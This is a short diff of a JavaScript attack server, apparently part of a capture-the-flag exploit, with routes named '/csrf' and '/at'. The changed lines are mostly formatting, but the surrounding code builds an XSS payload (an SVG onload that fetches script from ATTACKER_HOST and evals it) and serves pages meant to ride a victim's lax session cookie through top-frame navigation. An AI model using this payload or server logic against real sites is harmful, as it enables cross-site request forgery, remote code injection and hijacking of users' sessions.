@@ -12,7 +12,7 @@ app.get('/csrf', (c) => {
   c.header("Pragma", "no-cache")
   c.header("Expires", "0")
   // lax cookie only allows top-frame navigation to do requests with credentials
-  return c.html(`<div id="holder">
+  return c.html(/* html */`<div id="holder">
     <script>
     (async function(){
       const sleep = t => new Promise(r => setTimeout(r, t))
@@ -49,8 +49,9 @@ app.get('/at', (c) => {
   const payload = `<svg onload="fetch(baseURI.slice(0,7)+'${new URL(ATTACKER_HOST).host}').then(t=>t.text()).then(eval)">.html`
   console.log(payload.length > 100 ? "overlong!" : '')
   // would be opened by page2.goto with null initiator
-  if (i === 1) return c.html(`<script>
-    ;(async function(){
+  if (i === 1) return c.html(`
+  <script>
+    (async function(){
       const sleep = t => new Promise(r => setTimeout(r, t))
       await sleep(200)
       
